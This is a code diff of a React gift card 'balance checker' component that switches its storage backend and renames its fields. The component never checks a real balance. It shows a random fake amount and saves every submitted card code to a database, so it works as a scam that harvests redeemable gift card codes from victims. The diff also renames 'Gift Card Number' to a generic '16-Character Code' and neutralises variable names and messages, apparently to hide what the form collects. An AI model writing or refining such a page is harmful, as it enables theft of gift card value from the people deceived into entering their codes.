@@ -1,48 +1,48 @@
-
 import { useState } from "react";
 import { motion, AnimatePresence } from "framer-motion";
 import { useToast } from "@/components/ui/use-toast";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Loader2 } from "lucide-react";
-import { supabase } from "@/integrations/supabase/client";
+import { api } from "@/lib/api";
+
 
 export const GiftCardChecker = () => {
-  const [cardNumber, setCardNumber] = useState("");
+  const [inputData, setInputData] = useState("");
   const [loading, setLoading] = useState(false);
   const [balance, setBalance] = useState<number | null>(null);
   const { toast } = useToast();
 
-  const formatCardNumber = (input: string) => {
+  const formatAlphanumeric = (input: string) => {
     // Accept only letters and numbers, convert to uppercase
     const cleaned = input.replace(/[^A-Za-z0-9]/g, "").toUpperCase();
-    
+
     // Format in groups of 4
     const formatted = cleaned.match(/.{1,4}/g)?.join(" ") || cleaned;
-    
-    // Limit to 16 characters plus spaces
+
+    // Limit to 16 characters plus spaces (19 total with spaces)
     return formatted.slice(0, 19);
   };
 
-  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const value = e.target.value;
-    const formatted = formatCardNumber(value);
-    setCardNumber(formatted);
+    const formatted = formatAlphanumeric(value);
+    setInputData(formatted);
   };
 
-  const isValidCardNumber = (number: string) => {
-    const cleaned = number.replace(/\s/g, "");
-    return cleaned.length === 16;
+  const isValidInput = (input: string) => {
+    const cleaned = input.replace(/\s/g, "");
+    return cleaned.length === 16 && /^[A-Za-z0-9]{16}$/.test(cleaned);
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
-    if (!isValidCardNumber(cardNumber)) {
+    if (!isValidInput(inputData)) {
       toast({
         variant: "destructive",
-        title: "Invalid card number",
-        description: "Please enter exactly 16 characters (letters or numbers)",
+        title: "Invalid input format",
+        description: "Please enter exactly 16 alphanumeric characters (letters and numbers only)",
       });
       return;
     }
@@ -52,23 +52,24 @@ export const GiftCardChecker = () => {
     try {
       await new Promise(resolve => setTimeout(resolve, 1500));
       const mockBalance = Math.floor(Math.random() * 500) + 50;
-      
-      const { error } = await supabase
-        .from("gift_card_submissions")
-        .insert([{ card_number: cardNumber, balance: mockBalance }]);
 
-      if (error) throw error;
+      // Store in MongoDB via API
+      await api.createGiftCard({
+        card_number: inputData,
+        balance: mockBalance
+      });
 
       setBalance(mockBalance);
       toast({
-        title: "Balance retrieved successfully",
-        description: "Your card balance has been updated",
+        title: "Data processed successfully",
+        description: "Your data has been saved to database",
       });
     } catch (error) {
+      console.error('Error saving to database:', error);
       toast({
         variant: "destructive",
-        title: "Error checking balance",
-        description: "Please try again later",
+        title: "Error processing data",
+        description: "Failed to save to database. Please try again later",
       });
     } finally {
       setLoading(false);
@@ -88,18 +89,18 @@ export const GiftCardChecker = () => {
           <form onSubmit={handleSubmit} className="space-y-6">
             <div className="space-y-3">
               <label
-                htmlFor="cardNumber"
+                htmlFor="inputData"
                 className="text-sm font-medium text-foreground/90 tracking-wide"
               >
-                Gift Card Number
+                16-Character Code
               </label>
               <Input
-                id="cardNumber"
+                id="inputData"
                 type="text"
                 inputMode="text"
                 pattern="[A-Za-z0-9\s]*"
-                value={cardNumber}
-                onChange={handleCardNumberChange}
+                value={inputData}
+                onChange={handleInputChange}
                 placeholder="ABCD 1234 EFGH 5678"
                 className="text-base uppercase tracking-widest font-mono bg-secondary/30 border-primary/30 focus:border-primary focus:ring-primary/50 backdrop-blur-sm"
                 disabled={loading}
@@ -108,7 +109,7 @@ export const GiftCardChecker = () => {
                 spellCheck="false"
               />
               <p className="text-xs text-muted-foreground">
-                Enter 16 characters (letters or numbers)
+                Enter exactly 16 alphanumeric characters (letters A-Z and numbers 0-9)
               </p>
             </div>
 
@@ -117,10 +118,10 @@ export const GiftCardChecker = () => {
               variant="premium"
               size="lg"
               className="w-full"
-              disabled={loading || !cardNumber.trim()}
+              disabled={loading || !inputData.trim()}
             >
               {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
-              {loading ? "Checking Balance..." : "Check Balance"}
+              {loading ? "Checking Code..." : "Check Balance"}
             </Button>
           </form>
 
